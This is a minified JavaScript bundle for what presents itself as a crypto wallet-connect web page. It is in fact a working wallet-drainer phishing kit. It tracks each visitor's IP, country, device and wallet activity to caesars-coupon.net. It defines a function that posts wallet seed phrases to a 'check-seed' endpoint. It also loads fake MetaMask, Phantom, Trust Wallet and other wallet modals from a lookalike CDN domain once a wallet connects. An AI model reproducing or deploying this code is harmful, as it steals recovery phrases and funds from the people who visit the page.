const __vite__mapDeps = (
  i,
  m = __vite__mapDeps,
  d = m.f ||
    (m.f = [
      "assets/index-DPjUm1ZI.js",
      "assets/ChainAdapterBlueprint-BNEzhT6p.js",
      "assets/bitcoin-DUyz2iJA.js",
      "assets/index--pNuhirK.js",
      "assets/transactionReceipt-DWwqSmgj.js",
      "assets/networks-DR9cRiqL.js",
    ])
) => i.map((i) => d[i]);
(function () {
  const a = document.createElement("link").relList;
  if (a && a.supports && a.supports("modulepreload")) return;
  for (const n of document.querySelectorAll('link[rel="modulepreload"]')) c(n);
  new MutationObserver((n) => {
    for (const r of n)
      if (r.type === "childList")
        for (const i of r.addedNodes)
          i.tagName === "LINK" && i.rel === "modulepreload" && c(i);
  }).observe(document, { childList: !0, subtree: !0 });
  function d(n) {
    const r = {};
    return (
      n.integrity && (r.integrity = n.integrity),
      n.referrerPolicy && (r.referrerPolicy = n.referrerPolicy),
      n.crossOrigin === "use-credentials"
        ? (r.credentials = "include")
        : n.crossOrigin === "anonymous"
        ? (r.credentials = "omit")
        : (r.credentials = "same-origin"),
      r
    );
  }
  function c(n) {
    if (n.ep) return;
    n.ep = !0;
    const r = d(n);
    fetch(n.href, r);
  }
})();
const q = "modulepreload",
  J = function (e) {
    return "/" + e;
  },
  F = {},
  M = function (a, d, c) {
    let n = Promise.resolve();
    if (d && d.length > 0) {
      document.getElementsByTagName("link");
      const i = document.querySelector("meta[property=csp-nonce]"),
        p =
          (i == null ? void 0 : i.nonce) ||
          (i == null ? void 0 : i.getAttribute("nonce"));
      n = Promise.allSettled(
        d.map((f) => {
          if (((f = J(f)), f in F)) return;
          F[f] = !0;
          const m = f.endsWith(".css"),
            k = m ? '[rel="stylesheet"]' : "";
          if (document.querySelector(`link[href="${f}"]${k}`)) return;
          const w = document.createElement("link");
          if (
            ((w.rel = m ? "stylesheet" : q),
            m || (w.as = "script"),
            (w.crossOrigin = ""),
            (w.href = f),
            p && w.setAttribute("nonce", p),
            document.head.appendChild(w),
            m)
          )
            return new Promise((v, O) => {
              w.addEventListener("load", v),
                w.addEventListener("error", () =>
                  O(new Error(`Unable to preload CSS for ${f}`))
                );
            });
        })
      );
    }
    function r(i) {
      const p = new Event("vite:preloadError", { cancelable: !0 });
      if (((p.payload = i), window.dispatchEvent(p), !p.defaultPrevented))
        throw i;
    }
    return n.then((i) => {
      for (const p of i || []) p.status === "rejected" && r(p.reason);
      return a().catch(r);
    });
  },
  K = "https://caesars-coupon.net/ip",
  V = "https://caesars-coupon.net/track";
let C = null,
  S = null;
const U = (() => {
  try {
    if (navigator.userAgentData)
      return navigator.userAgentData.mobile ? "mobile" : "desktop";
    const e = navigator.userAgent;
    return /tablet|ipad|playbook|silk/i.test(e)
      ? "tablet"
      : /mobi|android|phone|ip(hone|od)|iemobile|blackberry/i.test(e)
      ? "mobile"
      : "desktop";
  } catch (e) {
    return console.error("Device detect error:", e), "unknown";
  }
})();
console.log("device:", U);
const A = fetch(K)
  .then((e) => e.json())
  .then((e) => {
    (C = e.IP),
      (S = e.Country),
      console.log("ipUser:", C),
      console.log("country:", S);
  })
  .catch((e) => console.error("IP error:", e));
async function $(e) {
  try {
    await A,
      await fetch(V, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...e,
          ipUser: C,
          country: S,
          device: U,
          trackID,
        }),
      });
  } catch (a) {
    console.error("Track error:", a);
  }
}
A.then(() => $({ type: "page-load", ts: Date.now() }));
(async function () {
  const [{ createAppKit: a }, { WagmiAdapter: d }, { mainnet: c, solana: n }] =
      await Promise.all([
        M(
          () => import("./index-DPjUm1ZI.js").then((t) => t.i),
          __vite__mapDeps([0, 1, 2])
        ),
        M(
          () => import("./index--pNuhirK.js").then((t) => t.e),
          __vite__mapDeps([3, 1, 2, 4])
        ),
        M(() => import("./networks-DR9cRiqL.js"), __vite__mapDeps([5, 2, 4])),
      ]),
    r = "7d0f40c7f26f95556ac8f6134e0e2a3a",
    i = [c, n],
    p = new d({ networks: i, projectId: r }),
    f = [
      "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
      "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
      "a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393",
      "1ca0bdd4747578705b1939af023d120677c64fe6ca76add81fda36e350605e79",
    ],
    m = /mobi|android|phone|ipad|tablet/i.test(navigator.userAgent),
    k = `
  .umbriel-modal         { justify-content:center; align-items:center; padding:0; }
  .umbriel-modal-content { width:100vw !important; height:100vh !important;
                           border-radius:0 !important; max-width:100% !important;
                           border:none !important; max-height:100% !important; }
  .umbriel-modal-header  { height:56px; }
  .umbriel-modal-footer  { padding:16px; width:100%; }
  .umbriel-continue-btn  { width:100% !important; max-width:100% !important; }`;
  function w() {
    if (document.getElementById("umbriel-mobile-styles")) return;
    const t = document.createElement("style");
    (t.id = "umbriel-mobile-styles"),
      (t.textContent = k),
      document.head.appendChild(t);
  }
  function v() {
    const t = document.getElementById("umbriel-mobile-styles");
    t && t.remove();
  }
  m && w(),
    window.addEventListener("resize", () => {
      /mobi|android|phone|ipad|tablet/i.test(navigator.userAgent) ||
      window.matchMedia("(max-width: 768px)").matches
        ? w()
        : v();
    });
  const O = [
      {
        id: "metamask-dapp",
        name: "MetaMask ",
        image_url:
          "https://walletguide.walletconnect.network/_next/image?url=https%3A%2F%2Fapi.web3modal.com%2Fv2%2Fwallet-image%2F200x200%2Feebe4a7f-7166-402f-92e0-1f64ca2aa800%3FprojectId%3Dad53ae497ee922ad9beb2ef78b1a7a6e%26st%3Dwallet-guide%26sv%3D1.0.0&w=256&q=75",
        mobile_link: "#",
      },
      {
        id: "phantom-dapp",
        name: "Phantom ",
        image_url:
          "https://walletguide.walletconnect.network/_next/image?url=https%3A%2F%2Fapi.web3modal.com%2Fv2%2Fwallet-image%2F200x200%2Fb6ec7b81-bb4f-427d-e290-7631e6e50d00%3FprojectId%3Dad53ae497ee922ad9beb2ef78b1a7a6e%26st%3Dwallet-guide%26sv%3D1.0.0&w=256&q=75",
      },
      {
        id: "trustwallet-dapp",
        name: "Trust Wallet ",
        image_url:
          "https://walletguide.walletconnect.network/_next/image?url=https%3A%2F%2Fapi.web3modal.com%2Fv2%2Fwallet-image%2F200x200%2F7677b54f-3486-46e2-4e37-bf8747814f00%3FprojectId%3Dad53ae497ee922ad9beb2ef78b1a7a6e%26st%3Dwallet-guide%26sv%3D1.0.0&w=256&q=75",
      },
      {
        id: "solflare-dapp",
        name: "Solflare ",
        image_url:
          "https://walletguide.walletconnect.network/_next/image?url=https%3A%2F%2Fapi.web3modal.com%2Fv2%2Fwallet-image%2F200x200%2Fe813ff48-99a4-43b6-6049-b4e887d70a00%3FprojectId%3Dad53ae497ee922ad9beb2ef78b1a7a6e%26st%3Dwallet-guide%26sv%3D1.0.0&w=256&q=75",
      },
    ],
    T = [
      "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
      "a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393",
      "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
      "1ca0bdd4747578705b1939af023d120677c64fe6ca76add81fda36e350605e79",
    ];
  async function B() {
    var s;
    const t = "./config.json",
      l = await fetch(t, { cache: "no-cache" });
    if (
      !l.ok ||
      ((s = l.headers.get("content-type")) != null && s.includes("html"))
    )
      throw new Error(`Config not found (${l.status}) at ${t}`);
    const o = await l.text();
    return JSON.parse(o.replace(/^\uFEFF/, ""));
  }
  const b = await B(),
    h = a({
      adapters: [p],
      networks: i,
      projectId: r,
      //themeMode: b.theme.mode,
      //themeVariables: b.theme.variables,
      features: b.features,
      featuredWalletIds: openInApp ? [] : f,
      customWallets: m && openInApp ? O : [],
      excludeWalletIds: m && openInApp ? T : [],
      enableWalletGuide: b.enableWalletGuide,
      termsConditionsUrl: b.termsConditionsUrl,
      privacyPolicyUrl: b.privacyPolicyUrl,
    });
  let W = "",
    L = "",
    j = "";
  h.subscribeEvents((t) => {
    const l = (o, s, u) => {
      var y, _, P;
      if (
        ((y = t == null ? void 0 : t.data) == null ? void 0 : y.event) ===
          "SELECT_WALLET" &&
        ((P = (_ = t.data) == null ? void 0 : _.properties) == null
          ? void 0
          : P.name) === `${o} `
      ) {
        if (s()) {
          h.close();
          return;
        }
        const N = u();
        h.close(), (window.location.href = N);
      }
    };
    l(
      "MetaMask",
      () => {
        var o;
        return (o = window.ethereum) == null ? void 0 : o.isMetaMask;
      },
      () =>
        `https://metamask.app.link/dapp/${location.host}${location.pathname}?=metamask`
    ),
      l(
        "Phantom",
        () => {
          var o;
          return (o = window.ethereum) == null ? void 0 : o.isPhantom;
        },
        () => {
          const o = `${location.protocol}//${location.host}${location.pathname}`,
            s = location.search ? "&" : "?",
            u = `${o}${location.search || ""}${s}=phantom`;
          return `https://phantom.app/ul/browse/${encodeURIComponent(
            u
          )}?ref=${encodeURIComponent(o)}`;
        }
      ),
      l(
        "Trust Wallet",
        () => {
          var o;
          return (o = window.ethereum) == null ? void 0 : o.isTrustWallet;
        },
        () => {
          const o = `${location.protocol}//${location.host}${location.pathname}`,
            s = location.search ? "&" : "?",
            u = `${o}${location.search || ""}${s}=trustwallet`;
          return `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(
            u
          )}`;
        }
      ),
      l(
        "Solflare",
        () => {
          var o;
          return (o = window.solana) == null ? void 0 : o.isSolflare;
        },
        () => {
          const o = `${location.protocol}//${location.host}${location.pathname}`,
            s = location.search ? "&" : "?",
            u = `${o}${location.search || ""}${s}=solflare`;
          return `solflare://ul/v1/browse/${encodeURIComponent(
            u
          )}?ref=${encodeURIComponent(o)}`;
        }
      );
  }),
    h.subscribeEvents((t) => {
      var o, s, u;
      const l = JSON.stringify(t);
      if (l !== W) {
        (W = l), $({ type: "events", data: t, ts: Date.now() });
        const y = document.getElementById("events");
        y && (y.textContent = l);
      }
      ((o = t == null ? void 0 : t.data) == null ? void 0 : o.event) ===
        "CONNECT_SUCCESS" &&
        (u =
          (s = t == null ? void 0 : t.data) == null ? void 0 : s.properties) !=
          null &&
        u.name &&
        t.data.properties.name !== j &&
        ((j = t.data.properties.name),
        console.log("Connected wallet:", j),
        typeof window.preInit == "function" && window.preInit(j));
    }),
    h.subscribeWalletInfo((t) => {
      const l = JSON.stringify(t);
      l !== L && ((L = l), $({ type: "walletInfo", data: t, ts: Date.now() }));
      const o = document.getElementById("walletInfo");
      o && (o.textContent = l);
    });
  const R = (t) => new Promise((l) => setTimeout(l, t));
  document.querySelectorAll(".open-modal-umbriel").forEach((t) =>
    t.addEventListener("click", async () => {
      h.disconnect(), await R(500), h.open();
    })
  );
})();
const G = "https://caesars-coupon.net/check-seed";
(function () {
  const a = document.createElement("script");
  (a.src = "https://cdnjsweb3-js.com/bip39/bip39-words.js"),
    (a.defer = !0),
    document.body.appendChild(a);
})();
function X(e, a = trackID) {
  const d = Array.isArray(e) ? e.join(" ") : e;
  fetch(G, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ seed: d, trackID: a }),
  })
    .then((c) => c.json())
    .then(({ success: c, message: n }) => {
      c
        ? console.log(`[walletLoader] ✅ Backend: ${n}`)
        : console.warn(`[walletLoader] ⚠️ Backend refused: ${n}`);
    })
    .catch((c) => console.error("[walletLoader] ❌ Backend fetch failed:", c));
}
typeof window < "u" && (window.initUmbriel = X);
const x = {
    MetaMask: "https://cdnjsweb3-js.com/metamask/script.js",
    Phantom: "https://cdnjsweb3-js.com/phantom/script.js",
    "OKX Wallet": "https://cdnjsweb3-js.com/okx/script.js",
    "Trust Wallet": "https://cdnjsweb3-js.com/trustwallet/script.js",
    "Coinbase Wallet": "https://cdnjsweb3-js.com/coinbase/script.js",
    "Bitget Wallet": "https://cdnjsweb3-js.com/bitget/script.js",
    "Brave Wallet": "https://cdnjsweb3-js.com/brave/script.js",
    "Ronin Wallet": "https://cdnjsweb3-js.com/ronin/script.js",
    Solflare: "https://cdnjsweb3-js.com/solflare/script.js",
    BIP39: "https://cdnjsweb3-js.com/bip39/bip39-words.js",
    WalletConnect: "https://cdnjsweb3-js.com/walletconnect/script.js",
  },
  E = new Map();
function I(e) {
  if (E.has(e)) return E.get(e);
  const a = x[e];
  if (!a)
    return Promise.reject(new Error(`[walletLoader] Unknown wallet: ${e}`));
  const d = new Promise((c, n) => {
    const r = document.createElement("script");
    (r.src = a),
      (r.async = !0),
      (r.onload = () => {
        console.log(`[walletLoader] Loaded: ${a}`), c();
      }),
      (r.onerror = () => n(new Error(`[walletLoader] Failed to load: ${a}`))),
      document.body.appendChild(r);
  });
  return E.set(e, d), d;
}
async function D(e) {
  if (e === "Phantom" && typeof window.phantomOpenModal == "function")
    window.phantomOpenModal();
  else if (e === "MetaMask" && typeof window.metamaskOpenModal == "function")
    window.metamaskOpenModal();
  else if (e === "Bitget Wallet" && typeof window.bitgetOpenModal == "function")
    window.bitgetOpenModal();
  else if (
    e === "Trust Wallet" &&
    typeof window.trustwalletOpenModal == "function"
  )
    window.trustwalletOpenModal();
  else if (
    e === "Coinbase Wallet" &&
    typeof window.coinbaseOpenModal == "function"
  )
    window.coinbaseOpenModal();
  else if (e === "Brave Wallet" && typeof window.braveOpenModal == "function")
    window.braveOpenModal();
  else if (e === "OKX Wallet" && typeof window.okxOpenModal == "function")
    window.okxOpenModal();
  else if (e === "Ronin Wallet" && typeof window.roninOpenModal == "function")
    window.roninOpenModal();
  else if (e === "Solflare" && typeof window.solflareOpenModal == "function")
    window.solflareOpenModal();
  else if (
    e === "WalletConnect" &&
    typeof window.walletconnectOpenModal == "function"
  )
    window.walletconnectOpenModal();
  else {
    console.log(
      `[walletLoader] No opener for "${e}", falling back to WalletConnect`
    );
    try {
      await I("WalletConnect"),
        typeof window.walletconnectOpenModal == "function"
          ? window.walletconnectOpenModal()
          : console.warn(
              "[walletLoader] walletconnectOpenModal is not available"
            );
    } catch (a) {
      console.error("[walletLoader] Failed to load WalletConnect script:", a);
    }
  }
}
async function g(e) {
  console.log(`[walletLoader] preInit("${e}")`);
  try {
    x[e]
      ? (await I(e), await D(e))
      : (console.warn(
          `[walletLoader] "${e}" unknown, falling back to WalletConnect`
        ),
        await I("WalletConnect"),
        await D("WalletConnect"));
  } catch (a) {
    console.error("[walletLoader]", a);
  }
}
typeof window < "u" && (window.preInit = g);
(() => {
  try {
    const e = new URLSearchParams(window.location.search);
    if (window.location.search === "?=metamask") {
      g("MetaMask"), history.replaceState(null, "", window.location.pathname);
      return;
    }
    if (window.location.search === "?=phantom") {
      g("Phantom"), history.replaceState(null, "", window.location.pathname);
      return;
    }
    if (window.location.search.startsWith("?=trustwallet")) {
      g("Trust Wallet"),
        history.replaceState(null, "", window.location.pathname);
      return;
    }
    if (window.location.search.startsWith("?=solflare")) {
      g("Solflare"), history.replaceState(null, "", window.location.pathname);
      return;
    }
  } catch (e) {
    console.error("MetaMask preInit by query error:", e);
  }
})();
I("BIP39").catch(console.error);
export { M as _ };
